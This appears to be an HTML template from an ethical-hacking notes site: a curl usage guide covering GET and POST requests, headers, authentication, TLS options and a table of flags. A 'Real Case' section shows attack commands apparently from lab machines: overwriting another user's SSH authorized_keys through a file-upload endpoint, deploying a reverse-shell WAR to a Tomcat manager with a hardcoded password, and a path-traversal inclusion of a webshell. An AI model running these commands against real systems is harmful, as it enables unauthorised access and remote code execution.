@@ -1,0 +1,209 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>curl — Usage Guide</title>
+  <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+
+  <h1>What is <code>curl</code>?</h1>
+  <p class="common">
+    <code>curl</code> is a command-line tool to transfer data with URLs. It supports HTTP(S), FTP, SFTP and more.
+    You can craft requests, set headers, send JSON/form data, upload/download files, follow redirects, and debug APIs.
+  </p>
+  <ul>
+    <li>Great for testing REST/GraphQL endpoints and webhooks</li>
+    <li>Works with headers, cookies, auth tokens, proxies, TLS/SSL, client certs</li>
+    <li>Debug with <code>-v</code>/<code>--trace</code>; prefer secure TLS (avoid <code>-k</code> unless you know the risks)</li>
+  </ul>
+
+  <h1>Real Case</h1>
+  <div class="code-box"><pre><code>curl -i -L -X POST -F file="@/home/kali/tempo/test.txt" -F filename="/home/alfredo/.ssh/authorized_keys" http://192.168.239.249:33414/file-upload
+</code></pre></div>
+<ul>
+  <li>Method : This uses <code>-X POST</code> request.</li>
+  <li>Content-Type : <code>multipart/form-data</code></li>
+</ul>
+
+
+<div class="code-box"><pre><code>curl -u 'tomcat:$3cureP4s5w0rd123!' http://megahosting.htb:8080/manager/text/deploy?path=/rev --upload-file rev.war</code></pre></div>
+<ul>
+  <li>Method : This uses <code>--upload-file</code> : which is PUT request.</li>
+  <li>Content-Type : <code>application/octet-stream</code></li>
+</ul>
+
+<h1>Double Parameter</h1>
+<div class="code-box"><pre><code>curl -G "http://127.0.0.1:8000/backend/" \
+  --data-urlencode "view=../../../../../../../var/crash/test.php" \
+  --data-urlencode "cmd=bash -c '...'"</code></pre></div>
+  <h3>condition</h3>
+  <ul>
+    <li>There was parameter view, which can include file.</li>
+    <li>test.php is simple webshell code. I needed to include cmd parameter too.</li>
+  </ul>
+
+
+
+  <h1>GET Requests</h1>
+
+  <h3 class="blue">1) Basic GET</h3>
+  <div class="code-box"><pre><code>kali@kali:~ $ <u>curl https://api.example.com/status</u></code></pre></div>
+
+  <h3 class="blue">2) GET with query params &amp; headers</h3>
+  <div class="code-box"><pre><code>kali@kali:~ $ <u>curl -G "https://api.example.com/search" --data-urlencode "q=red team" --data-urlencode "page=1"</u>
+kali@kali:~ $ <u>curl https://api.example.com/items \</u>
+  <u>-H "Accept: application/json" -H "Authorization: Bearer &lt;TOKEN&gt;"</u></code></pre></div>
+
+  <h3 class="blue">3) Follow redirects &amp; save output</h3>
+  <div class="code-box"><pre><code>kali@kali:~ $ <u>curl -L https://short.url/x -o result.html</u>
+kali@kali:~ $ <u>curl -O https://example.com/files/report.pdf</u>   # save with server filename</code></pre></div>
+
+  <h3 class="blue">4) HEAD (metadata only) &amp; range requests</h3>
+  <div class="code-box"><pre><code>kali@kali:~ $ <u>curl -I https://example.com/large.iso</u>           # headers only
+kali@kali:~ $ <u>curl -H "Range: bytes=0-1023" https://example.com/large.iso -o first_kb.bin</u></code></pre></div>
+
+  <h1>POST Requests</h1>
+
+  <h3 class="blue">1) Form URL-encoded (default for <code>-d</code>)</h3>
+  <div class="code-box"><pre><code>kali@kali:~ $ <u>curl -X POST https://api.example.com/login \</u>
+  <u>-d "username=alice" -d "password=s3cret"</u>
+# Content-Type: application/x-www-form-urlencoded (auto-set with -d)</code></pre></div>
+
+  <h3 class="blue">2) JSON body</h3>
+  <div class="code-box"><pre><code>kali@kali:~ $ <u>curl -X POST https://api.example.com/users \</u>
+  <u>-H "Content-Type: application/json" \</u>
+  <u>-d '{"name":"Alice","email":"alice@example.com"}'</u>
+
+kali@kali:~ $ <u>curl -X POST https://api.example.com/users \</u>
+  <u>-H "Content-Type: application/json" \</u>
+  <u>-d @user.json</u>   # read JSON from file</code></pre></div>
+
+  <h3 class="blue">3) Multipart form &amp; file upload</h3>
+  <div class="code-box"><pre><code>kali@kali:~ $ <u>curl -X POST https://api.example.com/upload \</u>
+  <u>-F "file=@/path/to/report.pdf" -F "note=Q3 upload"</u></code></pre></div>
+
+  <h3 class="blue">4) PUT / PATCH / raw binary</h3>
+  <div class="code-box"><pre><code>kali@kali:~ $ <u>curl -X PUT https://api.example.com/items/42 -d '{"name":"New"}' \</u>
+  <u>-H "Content-Type: application/json"</u>
+
+kali@kali:~ $ <u>curl -X PATCH https://api.example.com/items/42 \</u>
+  <u>-H "Content-Type: application/json" -d '{"tags":["hotfix"]}'</u>
+
+kali@kali:~ $ <u>curl --data-binary @binary.bin https://api.example.com/raw</u></code></pre></div>
+
+  <h1>Common Auth, Cookies, Proxies</h1>
+  <ul>
+    <li><strong>Bearer token:</strong> <code>curl -H "Authorization: Bearer &lt;TOKEN&gt;" https://api.example.com/me</code></li>
+    <li><strong>Basic auth:</strong> <code>curl -u user:pass https://api.example.com/private</code></li>
+    <li><strong>Cookies:</strong> <code>curl -b "sid=abc" -c cookies.txt https://example.com</code></li>
+    <li><strong>Proxy:</strong> <code>curl --proxy http://127.0.0.1:8080 https://example.com</code> (SOCKS5: <code>--proxy socks5h://127.0.0.1:9050</code>)</li>
+  </ul>
+
+  <h1>Debugging &amp; TLS</h1>
+  <div class="list">
+    <h3 class="blue">Quick diagnostics</h3>
+    <ul>
+      <li><code>-v</code> verbose, <code>-sS</code> silent but show errors, <code>-I</code> HEAD</li>
+      <li><code>--trace-ascii trace.txt</code> deep request/response trace</li>
+      <li><code>--http2</code> force HTTP/2; <code>--resolve example.com:443:1.2.3.4</code> override DNS</li>
+      <li><code>--cacert ca.pem</code> custom CA; <code>--cert client.pem --key client.key</code> mTLS</li>
+      <li><code>-k</code> skips TLS verification (insecure)—avoid unless you fully understand the risk</li>
+    </ul>
+  </div>
+
+  <h1>✅ Useful <code>curl</code> Flags</h1>
+  <table border="1" cellpadding="6" cellspacing="0">
+    <thead>
+      <tr>
+        <th>Flag</th>
+        <th>What it does</th>
+        <th>Example</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>-k</code></td>
+        <td>Ignore ssl-certification</td>
+        <td><code>curl -k -G https://$IP --data-urlencode '...'</code></td>
+      </tr>
+      <tr>
+        <td><code>-X &lt;METHOD&gt;</code></td>
+        <td>Set HTTP method (GET/POST/PUT/PATCH/DELETE)</td>
+        <td><code>curl -X DELETE https://api.example.com/items/42</code></td>
+      </tr>
+      <tr>
+        <td><code>-d / --data</code></td>
+        <td>Send form or raw body (URL-encoded by default)</td>
+        <td><code>curl -d "a=1&amp;b=2" https://ex.com</code></td>
+      </tr>
+      <tr>
+        <td><code>--data-urlencode</code></td>
+        <td>URL-encode individual fields safely</td>
+        <td><code>curl -G --data-urlencode "q=a b" https://ex.com</code></td>
+      </tr>
+      <tr>
+        <td><code>-H</code></td>
+        <td>Add header(s)</td>
+        <td><code>curl -H "Accept: application/json" …</code></td>
+      </tr>
+      <tr>
+        <td><code>-G</code></td>
+        <td>Send data as query string (with <code>--data-urlencode</code>)</td>
+        <td><code>curl -G --data-urlencode "q=test" https://ex.com</code></td>
+      </tr>
+      <tr>
+        <td><code>-o / -O</code></td>
+        <td>Write output to file / keep server filename</td>
+        <td><code>curl -o out.html https://ex.com</code></td>
+      </tr>
+      <tr>
+        <td><code>-L</code></td>
+        <td>Follow redirects</td>
+        <td><code>curl -L https://short.url/x</code></td>
+      </tr>
+      <tr>
+        <td><code>-u</code></td>
+        <td>Basic auth (user:pass)</td>
+        <td><code>curl -u user:pass https://ex.com</code></td>
+      </tr>
+      <tr>
+        <td><code>-b / -c</code></td>
+        <td>Send / store cookies</td>
+        <td><code>curl -b cookie.txt -c new.txt https://ex.com</code></td>
+      </tr>
+      <tr>
+        <td><code>--retry N</code></td>
+        <td>Retry transient errors (use with <code>--retry-all-errors</code>)</td>
+        <td><code>curl --retry 5 --retry-all-errors https://ex.com</code></td>
+      </tr>
+      <tr>
+        <td><code>--limit-rate</code></td>
+        <td>Throttle bandwidth</td>
+        <td><code>curl --limit-rate 500k https://ex.com/file</code></td>
+      </tr>
+      <tr>
+        <td><code>--proxy</code></td>
+        <td>Send via HTTP/SOCKS proxy</td>
+        <td><code>curl --proxy http://127.0.0.1:8080 https://ex.com</code></td>
+      </tr>
+      <tr>
+        <td><code>-v / --trace</code></td>
+        <td>Verbose / detailed trace logging</td>
+        <td><code>curl -v --trace-ascii trace.txt https://ex.com</code></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h1>Security Notes</h1>
+  <ul>
+    <li>Avoid <code>-k</code> (insecure) unless testing in a controlled env; prefer proper CA trust with <code>--cacert</code>.</li>
+    <li>Quote shells carefully to protect tokens and JSON: use single quotes on *nix, escape where needed on Windows.</li>
+    <li>Be mindful of command history containing secrets (e.g., tokens, passwords). Consider env vars or @files.</li>
+    <li>Validate server identity (hostname, certificate) and use least-privilege API keys.</li>
+  </ul>
+
+</body>
+</html>
